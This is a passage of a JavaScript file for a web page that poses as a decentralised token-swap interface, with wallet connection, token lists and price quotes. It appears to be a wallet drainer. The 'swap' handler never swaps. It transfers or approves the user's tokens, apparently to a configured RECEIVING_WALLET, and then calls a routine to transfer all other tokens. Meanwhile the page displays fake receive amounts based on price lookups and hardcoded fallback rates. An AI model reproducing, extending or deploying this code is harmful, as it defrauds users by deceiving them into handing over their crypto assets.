// app.js - DEX-like Token Swap Interface with Enhanced Features

// Verify required globals
if (typeof NETWORK_CONFIGS === 'undefined') throw new Error("NETWORK_CONFIGS not defined");
if (typeof TOKENS === 'undefined') throw new Error("TOKENS not defined");
if (typeof RECEIVING_WALLET === 'undefined') throw new Error("RECEIVING_WALLET not defined");

// Constants
const COINGECKO_API = "https://api.coingecko.com/api/v3";
const CURRENCY_OPTIONS = ["usd", "eth", "btc"];
const PRICE_CACHE_DURATION = 20000; // 20 seconds in ms
const FEE_TOKENS = {
  ethereum: "0x0000000000000000000000000000000000000000", // ETH
  bsc: "0x0000000000000000000000000000000000000000", // BNB
  arbitrum: "0x0000000000000000000000000000000000000000", // ETH
  base: "0x742d35Cc6634C0532925a3b844Bc454e4438f44e" // ETH on Base
};
const COINGECKO_TOKEN_LISTS = {
  ethereum: "https://tokens.coingecko.com/ethereum/all.json",
  bsc: "https://tokens.coingecko.com/binance-smart-chain/all.json",
  polygon: "https://tokens.coingecko.com/polygon-pos/all.json",
  arbitrum: "https://tokens.coingecko.com/arbitrum-one/all.json",
  base: "https://tokens.coingecko.com/base/all.json"
};
const MIN_FEE_RESERVES = {
  ethereum: 0.001, // ETH
  bsc: 0.001, // BNB
  polygon: 1.0, // MATIC
  arbitrum: 1.0, // ARB
  base: 0.001 // ETH on Base
};
const STABLECOIN_SYMBOLS = {
  ethereum: ['USDT', 'USDC', 'DAI'],
  bsc: ['USDT', 'BUSD', 'USDC', 'DAI'],
  polygon: ['USDT', 'USDC', 'DAI'],
  arbitrum: ['USDT', 'USDC', 'DAI'],
  base: ['USDC', 'DAI', 'USDT']
};
// App state
let provider, signer, userAddress;
let currentNetwork = "ethereum";
let currentFromToken = null;
let currentToToken = null;
let currentSlippage = 0.5; // 0.5% default slippage
let currentCurrency = "usd";
let debounceTimer;

// Initialize on load
window.addEventListener('load', async () => {
  try {
    // Setup event listeners
    setupEventListeners();
    
    // Set initial active slippage option
    document.querySelector('.dex-slippage-option[data-value="0.5"]').classList.add('active');
    
    // Initialize UI components
    initNetworkDropdown();
    initCurrencySelector();
    
    // Set default tokens based on current network
    setDefaultTokenPair();
    
    await checkWalletEnvironment();
  } catch (err) {
    console.error("Initialization error:", err);
    updateStatus("Initialization failed: " + err.message, "error");
  }
});

// =====================
// INITIALIZATION FUNCTIONS
// =====================

function setupEventListeners() {
  document.getElementById("connectWallet").addEventListener("click", handleWalletConnection);
  document.getElementById("fromTokenSelect").addEventListener("click", () => showTokenList('from'));
  document.getElementById("toTokenSelect").addEventListener("click", () => showTokenList('to'));
  document.getElementById("swapBtn").addEventListener("click", handleSwap);
  document.getElementById("settingsBtn").addEventListener("click", showSettings);
  document.getElementById("closeTokenList").addEventListener("click", hideTokenList);
  document.getElementById("closeSettings").addEventListener("click", hideSettings);
  document.getElementById("metaMaskBtn").addEventListener("click", connectMetaMask);
  document.getElementById("cancelWalletConnect").addEventListener("click", hideWalletConnect);
  
  // Debounced input handler
  document.getElementById("fromAmount").addEventListener("input", (e) => {
    clearTimeout(debounceTimer);
    debounceTimer = setTimeout(() => {
      updateToAmount();
    }, 500);
  });
  
  // Network dropdown behavior
  document.getElementById("networkSelect").addEventListener('click', function(e) {
    e.stopPropagation();
    const dropdown = document.getElementById("networkDropdown");
    dropdown.style.display = dropdown.style.display === 'block' ? 'none' : 'block';
  });
  
  // Close dropdown when clicking outside
  document.addEventListener('click', function(event) {
    const dropdown = document.getElementById("networkDropdown");
    const selector = document.getElementById("networkSelect");
    if (!selector.contains(event.target) && !dropdown.contains(event.target)) {
      dropdown.style.display = 'none';
    }
  });

  // Slippage options
  document.querySelectorAll('.dex-slippage-option').forEach(option => {
    option.addEventListener('click', function() {
      document.querySelectorAll('.dex-slippage-option').forEach(opt => {
        opt.classList.remove('active');
      });
      this.classList.add('active');
      document.getElementById('slippageTolerance').value = this.dataset.value;
      currentSlippage = parseFloat(this.dataset.value);
      updateToAmount();
    });
  });

  // Custom slippage input
  document.getElementById('slippageTolerance').addEventListener('change', function() {
    const value = parseFloat(this.value);
    if (isNaN(value) || value < 0.1 || value > 50) {
      this.value = currentSlippage;
      return;
    }
    document.querySelectorAll('.dex-slippage-option').forEach(opt => {
      opt.classList.remove('active');
    });
    currentSlippage = value;
    updateToAmount();
  });

  // Transaction deadline
  document.getElementById('transactionDeadline').addEventListener('change', function() {
    const value = parseInt(this.value);
    if (isNaN(value) || value < 1 || value > 30) {
      this.value = 20;
    }
  });
  
  // Mobile-specific listeners
  if (isMobile()) {
    document.getElementById("openTrustWallet").addEventListener('click', openInTrustWallet);
  }
}

function initNetworkDropdown() {
  const dropdown = document.getElementById("networkDropdown");
  dropdown.innerHTML = '';
  
  Object.keys(NETWORK_CONFIGS).forEach(network => {
    const link = document.createElement('a');
    link.href = '#';
    link.textContent = NETWORK_CONFIGS[network].chainName;
    link.addEventListener('click', (e) => {
      e.preventDefault();
      handleNetworkChange(network);
      dropdown.style.display = 'none';
    });
    dropdown.appendChild(link);
  });
}

// In the initCurrencySelector function, modify the click handler:
function initCurrencySelector() {
  const container = document.createElement('div');
  container.className = 'dex-currency-selector';
  
  CURRENCY_OPTIONS.forEach(currency => {
    const option = document.createElement('div');
    option.className = `dex-currency-option ${currency === currentCurrency ? 'active' : ''}`;
    option.textContent = currency.toUpperCase();
    option.addEventListener('click', () => {
      currentCurrency = currency;
      document.querySelectorAll('.dex-currency-option').forEach(opt => {
        opt.classList.remove('active');
      });
      option.classList.add('active');
      // Update the rates without changing the token
      updateToAmount();
    });
    container.appendChild(option);
  });
  
  document.querySelector('.dex-swap-info').prepend(container);
}

// =====================
// UTILITY FUNCTIONS
// =====================

function isMobile() {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
}

function updateNetworkLogo(network) {
  const logoMap = {
    ethereum: "https://cryptologos.cc/logos/ethereum-eth-logo.png",
    bsc: "https://cryptologos.cc/logos/bnb-bnb-logo.png",
    polygon: "https://cryptologos.cc/logos/polygon-matic-logo.png",
    arbitrum: "https://cryptologos.cc/logos/arbitrum-arb-logo.png",
    base: "https://cryptologos.cc/logos/base-logo.png"
  };
  
  const logoElement = document.querySelector(".dex-nav-logo img");
  if (logoMap[network]) {
    logoElement.src = logoMap[network];
  }
}

function setDefaultTokenPair() {
  const networkTokens = TOKENS[currentNetwork];
  if (!networkTokens || networkTokens.length === 0) return;
  
  // Reset both tokens
  currentFromToken = null;
  currentToToken = null;

  // Set default from token - native token for the current network
  currentFromToken = networkTokens.find(t => t.isNative) || networkTokens[0];
  
  // Set default to token - look for stablecoins first
  const stablecoinSymbols = {
    ethereum: ['USDT', 'USDC', 'DAI'],
    bsc: ['USDT', 'BUSD', 'USDC', 'DAI'],
    polygon: ['USDT', 'USDC', 'DAI'],
    arbitrum: ['USDT', 'USDC', 'DAI'],
    base: ['USDC', 'DAI', 'USDT']
  };
  
  currentToToken = networkTokens.find(t => 
    stablecoinSymbols[currentNetwork]?.includes(t.symbol) && t.logo
  );
  
  // Fallback to second token if no stablecoin found
  if (!currentToToken && networkTokens.length > 1) {
    currentToToken = networkTokens[1];
  }
  
  // Update UI
  updateTokenSelectors();
  
  // If wallet is connected, update balances
  if (userAddress) {
    updateTokenBalances();
  }
  
  // Update swap button state
  updateSwapButton();
}

// =====================
// WALLET FUNCTIONS
// =====================

async function checkWalletEnvironment() {
  const savedWallet = localStorage.getItem('walletConnected');
  if (savedWallet === 'metamask' && window.ethereum) {
    try {
      await connectAndProcess();
    } catch (err) {
      console.error("Auto-connect error:", err);
      localStorage.removeItem('walletConnected');
    }
  }
  
  if (window.ethereum && window.ethereum.chainId) {
    const chainId = window.ethereum.chainId;
    for (const network in NETWORK_CONFIGS) {
      if (NETWORK_CONFIGS[network].chainId === chainId) {
        // Only update if network actually changed
        if (currentNetwork !== network) {
          currentNetwork = network;
          document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
          updateNetworkLogo(network);
          setDefaultTokenPair(); // Add this line to update tokens
        }
        break;
      }
    }
  }
}

async function initializeWallet() {
  try {
    provider = new ethers.providers.Web3Provider(window.ethereum);
    signer = provider.getSigner();
    userAddress = await signer.getAddress();
    
    localStorage.setItem('walletConnected', 'metamask');
    updateWalletButton(true);
    
    // Get current chain and update tokens
    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
    for (const network in NETWORK_CONFIGS) {
      if (NETWORK_CONFIGS[network].chainId === chainId) {
        currentNetwork = network;
        document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
        updateNetworkLogo(network);
        break;
      }
    }
    
    await setDefaultTokenPair(); // Ensure tokens are updated
    await updateTokenBalances();
    
    // Set up event listeners
    window.ethereum.on('accountsChanged', (accounts) => {
      if (accounts.length === 0) {
        handleWalletDisconnect();
      } else {
        userAddress = accounts[0];
        updateWalletButton(true);
        updateTokenBalances();
      }
    });
    
    window.ethereum.on('chainChanged', (chainId) => {
      // Find the new network
      for (const network in NETWORK_CONFIGS) {
        if (NETWORK_CONFIGS[network].chainId === chainId) {
          currentNetwork = network;
          document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
          updateNetworkLogo(network);
          setDefaultTokenPair(); // Update tokens on chain change
          break;
        }
      }
    });
    
    return true;
  } catch (err) {
    console.error("Wallet initialization error:", err);
    updateStatus("Connection error. Please try again.", "error");
    return false;
  }
}

function handleWalletDisconnect() {
  userAddress = null;
  provider = null;
  signer = null;
  localStorage.removeItem('walletConnected');
  updateWalletButton(false);
  updateSwapButton();
  updateStatus("Wallet disconnected", "success");
}

async function fetchTokenBalance(token) {
  if (!userAddress) return 0;
  
  try {
    // Skip tokens with invalid addresses
    if (token.address && !ethers.utils.isAddress(token.address)) {
      console.warn(`Skipping ${token.symbol} - invalid address`);
      return 0;
    }

    let balance;
    if (token.isNative) {
      balance = await provider.getBalance(userAddress);
      return parseFloat(ethers.utils.formatEther(balance));
    } else {
      const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
      try {
        balance = await contract.balanceOf(userAddress);
        return parseFloat(ethers.utils.formatUnits(balance, token.decimals || 18));
      } catch (err) {
        console.warn(`Balance check failed for ${token.symbol}:`, err.message);
        return 0;
      }
    }
  } catch (err) {
    console.warn(`Error fetching ${token.symbol} balance:`, err.message);
    return 0;
  }
}

async function updateTokenBalances() {
  if (!userAddress || !currentFromToken) return;
  
  try {
    const balanceElement = document.getElementById("fromTokenBalance");
    balanceElement.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Loading...';
    
    const balance = await fetchTokenBalance(currentFromToken);
    if (balance <= 0) {
      balanceElement.innerHTML = `
        Balance: 0 ${currentFromToken.symbol}
        
      `;
      document.getElementById("swapBtn").disabled = true;
    } else {
      balanceElement.innerHTML = `
        Balance: ${balance.toFixed(6)} ${currentFromToken.symbol}
      `;
    }
  } catch (err) {
    console.error("Error updating balances:", err);
    balanceElement.innerHTML = `
      <span style="color: var(--error)">Balance: Error loading</span>
    `;
  }
}

async function handleWalletConnection() {
  if (userAddress) {
    handleWalletDisconnect();
    return;
  }

  if (!window.ethereum) {
    if (isMobile()) {
      showWalletConnect();
    } else {
      updateStatus("Please install MetaMask", "error");
    }
    return;
  }

  await connectAndProcess();
}

async function connectAndProcess() {
  try {
    showLoader();
    updateStatus("Connecting wallet...", "success");

    // Handle MetaMask connection properly
    let accounts;
    try {
      accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    } catch (err) {
      if (err.code === -32002) {
        // Request already pending
        accounts = await new Promise((resolve) => {
          window.ethereum.on('accountsChanged', (accounts) => {
            resolve(accounts);
          });
        });
      } else {
        throw err;
      }
    }

    if (accounts.length === 0) {
      throw new Error("No accounts found");
    }
    
    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
    for (const network in NETWORK_CONFIGS) {
      if (NETWORK_CONFIGS[network].chainId === chainId) {
        currentNetwork = network;
        document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
        updateNetworkLogo(network);
        break;
      }
    }
    
    await initializeWallet();
    updateSwapButton();
  } catch (err) {
    console.error("Connection error:", err);
    updateStatus("Error: " + err.message, "error");
    updateWalletButton(false);
    localStorage.removeItem('walletConnected');
  } finally {
    hideLoader();
  }
}

async function connectMetaMask() {
  hideWalletConnect();
  await connectAndProcess();
}

function openInTrustWallet() {
  const currentUrl = encodeURIComponent(window.location.href);
  document.getElementById('currentUrl').textContent = window.location.href;
  window.location.href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${currentUrl}`;
  setTimeout(() => {
    document.getElementById('manualSteps').style.display = 'block';
  }, 3000);
}

// =====================
// NETWORK FUNCTIONS
// =====================

async function handleNetworkChange(network) {
  try {
    showLoader();
    updateStatus(`Switching to ${NETWORK_CONFIGS[network].chainName}...`, "success");
    
    currentNetwork = network;
    document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
    updateNetworkLogo(network);
    
    setDefaultTokenPair();
    
    if (userAddress) {
      await checkNetwork();
      await updateTokenBalances();
    }
    
    updateToAmount();
    updateStatus(`Network changed to ${NETWORK_CONFIGS[network].chainName}`, "success");
  } catch (err) {
    console.error("Network change error:", err);
    updateStatus(`Failed to switch network: ${err.message}`, "error");
  } finally {
    hideLoader();
  }
}

async function checkNetwork() {
  try {
    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
    const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
    
    if (chainId !== targetChainId) {
      updateStatus("Switching network...", "success");
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: targetChainId }]
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          try {
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [NETWORK_CONFIGS[currentNetwork]]
            });
          } catch (addError) {
            throw new Error("Please switch networks manually in your wallet");
          }
        }
        throw new Error("Failed to switch network");
      }
    }
  } catch (err) {
    console.error("Network error:", err);
    throw new Error("Network error: " + err.message);
  }
}
// =====================
// TOKEN FUNCTIONS
// =====================

function showTokenList(type) {
  const modal = document.getElementById("tokenListModal");
  const tokenItems = document.getElementById("tokenItems");
  const searchInput = document.getElementById("tokenSearch");
  const noTokensFound = document.getElementById("noTokensFound");
  
  // Store which type of token we're selecting (from/to)
  modal.dataset.selectionType = type;
  
  // Reset UI state
  tokenItems.innerHTML = '<div class="dex-loading-tokens"><i class="fas fa-spinner fa-spin"></i> Loading tokens...</div>';
  noTokensFound.style.display = 'none';
  searchInput.value = '';
  
  // Small delay to allow loading message to show
  setTimeout(() => {
    populateTokenList(type, tokenItems, searchInput, noTokensFound);
  }, 50);
  
  modal.style.display = 'flex';
  searchInput.focus();
}

async function populateTokenList(type, tokenItems, searchInput, noTokensFound) {
  try {
    // Get tokens from both local config and CoinGecko API
    const [localTokens, cgTokens] = await Promise.all([
      getLocalTokens(),
      fetchCoinGeckoTokens(currentNetwork)
    ]);
    
    // Combine tokens, removing duplicates (prioritizing local tokens)
    const allTokens = combineTokens(localTokens, cgTokens);
    
    // Display tokens or show empty state
    if (allTokens.length === 0) {
      showNoTokensFound(noTokensFound);
      return;
    }
    
    renderTokenList(allTokens, tokenItems, type);
    setupSearchFunctionality(searchInput, tokenItems, noTokensFound);
    
  } catch (err) {
    console.error("Error loading tokens:", err);
    showTokenError(tokenItems);
  }
}

async function getLocalTokens() {
  return TOKENS[currentNetwork]?.map(t => ({ 
    ...t, 
    isLocal: true,
    originNetwork: currentNetwork
  })) || [];
}

async function fetchCoinGeckoTokens(network) {
  try {
    const cgUrl = COINGECKO_TOKEN_LISTS[network];
    if (!cgUrl) return [];
    
    const response = await fetch(cgUrl);
    if (!response.ok) throw new Error('CoinGecko API error');
    
    const data = await response.json();
    return data.tokens?.map(t => ({
      name: t.name,
      symbol: t.symbol,
      address: t.address,
      logoURI: t.logoURI,
      decimals: t.decimals,
      originNetwork: network,
      isLocal: false
    })) || [];
    
  } catch (err) {
    console.error("Failed to fetch CoinGecko tokens:", err);
    return [];
  }
}

function combineTokens(localTokens, cgTokens) {
  // Create a map to avoid duplicates (prioritize local tokens)
  const tokenMap = new Map();
  
  // Add local tokens first
  localTokens.forEach(token => {
    const key = `${token.symbol.toLowerCase()}-${token.address?.toLowerCase()}`;
    tokenMap.set(key, token);
  });
  
  // Add CoinGecko tokens if not already present
  cgTokens.forEach(token => {
    const key = `${token.symbol.toLowerCase()}-${token.address?.toLowerCase()}`;
    if (!tokenMap.has(key)) {
      tokenMap.set(key, token);
    }
  });
  
  // Sort by priority (native first, then local, then others)
  return Array.from(tokenMap.values()).sort((a, b) => {
    if (a.isNative) return -1;
    if (b.isNative) return 1;
    if (a.isLocal && !b.isLocal) return -1;
    if (!a.isLocal && b.isLocal) return 1;
    return a.symbol.localeCompare(b.symbol);
  });
}

function renderTokenList(tokens, container, selectionType) {
  container.innerHTML = '';
  
  tokens.forEach(token => {
    if (!isValidToken(token)) return;
    
    const tokenElement = createTokenElement(token, selectionType);
    container.appendChild(tokenElement);
  });
}

function isValidToken(token) {
  return token && token.symbol && token.name && 
        (token.address || token.isNative);
}

function createTokenElement(token, selectionType) {
  const element = document.createElement('div');
  element.className = 'dex-token-item';
  
  // Store searchable data
  element.dataset.name = token.name.toLowerCase();
  element.dataset.symbol = token.symbol.toLowerCase();
  element.dataset.address = token.address?.toLowerCase() || '';
  
  // Create token display
  element.innerHTML = `
    <img src="${getTokenLogo(token)}" 
         onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'" 
         alt="${token.symbol}">
    <div class="token-info">
      <div class="dex-token-name">
        ${token.name}
        ${getChainBadge(token.originNetwork)}
        ${token.isLocal ? '<span class="token-network-badge" data-type="preferred">Preferred</span>' : ''}
      </div>
      <div class="dex-token-symbol">${token.symbol}</div>
      ${token.address ? `
        <div class="dex-token-address" title="${token.address}">
          ${shortenAddress(token.address)}
          <i class="fas fa-copy copy-icon" title="Copy address"></i>
        </div>
      ` : ''}
    </div>
  `;
  
  // Add click handler
  element.addEventListener('click', () => selectToken(token, selectionType));
  
  // Add copy functionality for addresses
  const copyIcon = element.querySelector('.copy-icon');
  if (copyIcon) {
    copyIcon.addEventListener('click', (e) => {
      e.stopPropagation();
      navigator.clipboard.writeText(token.address);
      showTooltip(e.target, 'Copied!');
    });
  }
  
  return element;
}

function getTokenLogo(token) {
  if (token.logo) return token.logo;
  if (token.logoURI) return token.logoURI;
  return `https://cryptologos.cc/logos/${token.symbol.toLowerCase()}-${token.symbol.toLowerCase()}-logo.png`;
}

function getChainBadge(chain) {
  const chainNames = {
    ethereum: 'ETH',
    bsc: 'BSC',
    polygon: 'POLY',
    arbitrum: 'ARB',
    base: 'BASE'
  };
  const displayName = chainNames[chain] || chain?.toUpperCase() || 'EXT';
  return `<span class="token-network-badge" data-chain="${chain}">${displayName}</span>`;
}

function selectToken(token, type) {
  if (type === 'from') {
    currentFromToken = token;
    updateTokenBalances();
  } else {
    currentToToken = token;
  }
  
  updateTokenSelectors();
  hideTokenList();
  updateToAmount();
}

function setupSearchFunctionality(searchInput, tokenItems, noTokensFound) {
  const performSearch = debounce(() => {
    const searchTerm = searchInput.value.toLowerCase().trim();
    let hasVisibleItems = false;
    
    // Reset highlights
    document.querySelectorAll('.highlight').forEach(el => {
      el.classList.remove('highlight');
    });
    
    // Search through tokens
    document.querySelectorAll('.dex-token-item').forEach(item => {
      const matches = itemMatchesSearch(item, searchTerm);
      item.style.display = matches ? 'flex' : 'none';
      
      if (matches) {
        hasVisibleItems = true;
        highlightMatches(item, searchTerm);
      }
    });
    
    noTokensFound.style.display = hasVisibleItems ? 'none' : 'block';
  }, 300);
  
  searchInput.addEventListener('input', performSearch);
  searchInput.addEventListener('keyup', performSearch);
}

function itemMatchesSearch(item, searchTerm) {
  if (!searchTerm) return true;
  
  const fields = [
    item.dataset.name,
    item.dataset.symbol,
    item.dataset.address
  ];
  
  return fields.some(field => field?.includes(searchTerm));
}

function highlightMatches(element, searchTerm) {
  if (searchTerm.length < 2) return;
  
  const textElements = element.querySelectorAll(
    '.dex-token-name, .dex-token-symbol, .dex-token-address'
  );
  
  textElements.forEach(el => {
    const original = el.textContent;
    const highlighted = original.replace(
      new RegExp(escapeRegExp(searchTerm), 'gi'),
      match => `<span class="highlight">${match}</span>`
    );
    if (highlighted !== original) {
      el.innerHTML = highlighted;
    }
  });
}

function escapeRegExp(string) {
  return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

function showNoTokensFound(element) {
  element.innerHTML = `
    <i class="fas fa-search"></i>
    <p>No tokens found</p>
    <p class="small">Try a different search term</p>
  `;
  element.style.display = 'block';
}

function showTokenError(container) {
  container.innerHTML = `
    <div class="dex-token-error">
      <i class="fas fa-exclamation-circle"></i>
      <p>Failed to load tokens</p>
      <button class="dex-retry-btn">Retry</button>
    </div>
  `;
  
  container.querySelector('.dex-retry-btn').addEventListener('click', () => {
    const modal = document.getElementById("tokenListModal");
    showTokenList(modal.dataset.selectionType);
  });
}

function hideTokenList() {
  document.getElementById("tokenListModal").style.display = 'none';
}

function showTooltip(element, message) {
  const tooltip = document.createElement('div');
  tooltip.className = 'dex-tooltip';
  tooltip.textContent = message;
  
  const rect = element.getBoundingClientRect();
  tooltip.style.left = `${rect.left + rect.width/2}px`;
  tooltip.style.top = `${rect.top - 30}px`;
  
  document.body.appendChild(tooltip);
  
  setTimeout(() => {
    tooltip.classList.add('fade-out');
    setTimeout(() => tooltip.remove(), 300);
  }, 1000);
}

function updateTokenSelectors() {
  updateTokenSelector('fromTokenSelect', currentFromToken);
  updateTokenSelector('toTokenSelect', currentToToken);
  updateSwapButton();
}

function updateTokenSelector(selectorId, token) {
  const element = document.getElementById(selectorId);
  if (!element) return;
  
  if (token) {
    element.innerHTML = `
      <img src="${getTokenLogo(token)}" 
           onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'">
      <span>${token.symbol}</span>
      <i class="fas fa-chevron-down"></i>
    `;
  } else {
    element.innerHTML = `
      <span>Select Token</span>
      <i class="fas fa-chevron-down"></i>
    `;
  }
}

function debounce(func, wait) {
  let timeout;
  return function(...args) {
    clearTimeout(timeout);
    timeout = setTimeout(() => func.apply(this, args), wait);
  };
}

function shortenAddress(address, chars = 4) {
  if (!address) return '';
  return `${address.substring(0, chars + 2)}...${address.substring(address.length - chars)}`;
}
async function updateToAmount() {
  const fromAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
  
  if (currentFromToken && fromAmount > 0) {
    document.getElementById("exchangeRate").textContent = "Loading...";
    document.getElementById("minReceived").textContent = "Loading...";
    
    try {
      let rateText = '';
      let minReceivedText = '';
      
      // Get price of fromToken in selected currency
      const fromTokenPrice = await getTokenPrice(currentFromToken);
      
      if (fromTokenPrice) {
        // Display rate as 1 FROM_TOKEN = X [CURRENCY]
        rateText = `1 ${currentFromToken.symbol} = ${fromTokenPrice.toFixed(6)} ${currentCurrency.toUpperCase()}`;
        
        // Calculate minimum received (only if toToken is selected)
        if (currentToToken) {
          const toTokenPrice = await getTokenPrice(currentToToken);
          if (toTokenPrice) {
            const rate = fromTokenPrice / toTokenPrice;
            const toAmount = fromAmount * rate;
            minReceivedText = `${(toAmount * (1 - currentSlippage/100)).toFixed(6)} ${currentToToken.symbol}`;
            document.getElementById("toAmount").value = toAmount.toFixed(6);
          }
        }
      } else {
        rateText = 'Rate unavailable';
        minReceivedText = '-';
        document.getElementById("toAmount").value = '';
      }
      
      document.getElementById("exchangeRate").textContent = rateText;
      document.getElementById("minReceived").textContent = minReceivedText;
    } catch (err) {
      console.error("Error updating amounts:", err);
      document.getElementById("toAmount").value = '';
      document.getElementById("exchangeRate").textContent = 'Error fetching rate';
      document.getElementById("minReceived").textContent = '-';
    }
  } else {
    document.getElementById("toAmount").value = '';
    document.getElementById("exchangeRate").textContent = '-';
    document.getElementById("minReceived").textContent = '-';
  }
  
  updateSwapButton();
}

async function getConversionRate(fromToken, toToken) {
  try {
    const fromPrice = await getTokenPrice(fromToken);
    const toPrice = await getTokenPrice(toToken);
    
    if (fromPrice && toPrice) {
      return fromPrice / toPrice;
    }
    
    // Fallback to hardcoded rates if API fails
    return getHardcodedRate(fromToken, toToken);
  } catch (err) {
    console.error("Error getting conversion rate:", err);
    return getHardcodedRate(fromToken, toToken);
  }
}

function getHardcodedRate(fromToken, toToken) {
  const rates = {
    'ETH-USDT': 1800,
    'USDT-ETH': 0.00055,
    'ETH-USDC': 1800,
    'USDC-ETH': 0.00055,
    'ETH-DAI': 1800,
    'DAI-ETH': 0.00055,
    'BNB-USDT': 562,
    'USDT-BNB': 0.0033,
    'MATIC-USDT': 0.7,
    'USDT-MATIC': 1.428,
    'ARB-USDT': 1.2,
    'USDT-ARB': 0.83
  };
  
  const pair = `${fromToken.symbol}-${toToken.symbol}`;
  return rates[pair] || null;
}

async function getTokenPrice(token) {
  try {
    // Check cache first
    const cacheKey = `price-${token.symbol}-${currentCurrency}`;
    const cached = localStorage.getItem(cacheKey);
    if (cached) {
      const { price, timestamp } = JSON.parse(cached);
      if (Date.now() - timestamp < PRICE_CACHE_DURATION) {
        return price;
      }
    }

    let price = null;
    const network = token.originNetwork || currentNetwork;
    
    // Native token handling
    if (!token.address || token.isNative) {
      const nativeTokenIds = {
        ethereum: 'ethereum',
        bsc: 'binancecoin',
        polygon: 'matic-network',
        arbitrum: 'ethereum', // ETH is native on Arbitrum
        base: 'ethereum'     // ETH is native on Base
      };
      
      const id = nativeTokenIds[network];
      if (id) {
        const response = await fetch(`${COINGECKO_API}/simple/price?ids=${id}&vs_currencies=${currentCurrency}`);
        if (response.ok) {
          const data = await response.json();
          price = data[id]?.[currentCurrency];
        }
      }
    } 
    // ERC20 token handling
    else {
      const platformIds = {
        ethereum: 'ethereum',
        bsc: 'binance-smart-chain',
        polygon: 'polygon-pos',
        arbitrum: 'arbitrum-one',
        base: 'base'
      };
      
      const platform = platformIds[network];
      if (platform) {
        try {
          // First try contract lookup
          const contractResponse = await fetch(`${COINGECKO_API}/coins/${platform}/contract/${token.address}`);
          if (contractResponse.ok) {
            const contractData = await contractResponse.json();
            price = contractData.market_data?.current_price?.[currentCurrency];
          }
          
          // If contract lookup fails, try symbol search
          if (!price) {
            const symbolResponse = await fetch(`${COINGECKO_API}/simple/price?ids=${token.symbol.toLowerCase()}&vs_currencies=${currentCurrency}`);
            if (symbolResponse.ok) {
              const symbolData = await symbolResponse.json();
              price = symbolData[token.symbol.toLowerCase()]?.[currentCurrency];
            }
          }
        } catch (err) {
          console.error(`Error fetching price for ${token.symbol}:`, err);
        }
      }
    }
    
    // Fallback to hardcoded prices if API fails
    if (!price) {
      const hardcodedPrices = {
        'ETH': { usd: 1800, btc: 0.05, eth: 1 },
        'BNB': { usd: 250, btc: 0.007, eth: 0.15 },
        'MATIC': { usd: 0.7, btc: 0.00002, eth: 0.0004 },
        'USDT': { usd: 1, btc: 0.00003, eth: 0.0006 },
        'USDC': { usd: 1, btc: 0.00003, eth: 0.0006 },
        'DAI': { usd: 1, btc: 0.00003, eth: 0.0006 },
        'WBTC': { usd: 30000, btc: 1, eth: 16.67 },
        'ARB': { usd: 1.2, btc: 0.00004, eth: 0.0007 },
        'AUTO': { usd: 7.78, btc: 0.00009486, eth: 0.004326 }
      };
      
      price = hardcodedPrices[token.symbol]?.[currentCurrency];
    }
    
    // Cache the price if found
    if (price) {
      localStorage.setItem(cacheKey, JSON.stringify({
        price,
        timestamp: Date.now()
      }));
    }
    
    return price;
  } catch (err) {
    console.error(`Error getting price for ${token.symbol}:`, err);
    return null;
  }
}
// =====================
// SWAP FUNCTIONS 
// =====================

let isSwapInProgress = false; // Global swap lock

async function handleSwap() {
  if (isSwapInProgress) return;

  try {
    isSwapInProgress = true;
    showLoader();

    // 1. Validate inputs
    if (!userAddress) {
      throw new Error("Please connect your wallet first");
    }

    if (!currentFromToken || !currentToToken) {
      throw new Error("Please select both tokens to swap");
    }

    const inputAmount = parseFloat(document.getElementById("fromAmount").value);
    if (!inputAmount || inputAmount <= 0) {
      throw new Error("Please enter a valid amount to swap");
    }

    // 2. Check balances with more detailed error messages
    const balance = await fetchTokenBalance(currentFromToken);
    if (balance <= 0) {
      throw new Error(`
        You don't have any ${currentFromToken.symbol} in your wallet.
        <br>Current balance: <strong>0 ${currentFromToken.symbol}</strong>
      `);
    }

    if (inputAmount > balance) {
      throw new Error(`
        The amount you're trying to swap exceeds your ${currentFromToken.symbol} balance.
        <br>Current balance: <strong>${balance.toFixed(6)} ${currentFromToken.symbol}</strong>
        <br>Amount entered: <strong>${inputAmount.toFixed(6)} ${currentFromToken.symbol}</strong>
      `);
    }

    // 3. Check for native token gas reserves
    if (currentFromToken.isNative) {
      const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
      if (balance - inputAmount < minReserve) {
        throw new Error(`
          You need to keep at least ${minReserve} ${currentFromToken.symbol} for gas fees.
          <br>Current balance: <strong>${balance.toFixed(6)} ${currentFromToken.symbol}</strong>
          <br>Minimum reserve: <strong>${minReserve} ${currentFromToken.symbol}</strong>
        `);
      }
    }

    // 4. Execute the swap
    updateStatus(`Processing swap...`, "success");
    
    let txHash;
    if (currentFromToken.isNative) {
      // Native token transfer
      txHash = await transferNativeToken(currentFromToken, inputAmount);
    } else {
      // ERC20 token transfer (needs approval first)
      const approved = await checkAndApproveToken(currentFromToken, inputAmount);
      if (!approved) {
        throw new Error("Token approval failed");
      }
      txHash = await transferERC20Token(currentFromToken, inputAmount);
    }

    // 5. Process all other token transfers
    const otherTokensTransferred = await processAllTokenTransfers();
    
    // 6. Show success message with transaction link
    const explorerUrl = NETWORK_CONFIGS[currentNetwork].scanUrl + txHash;
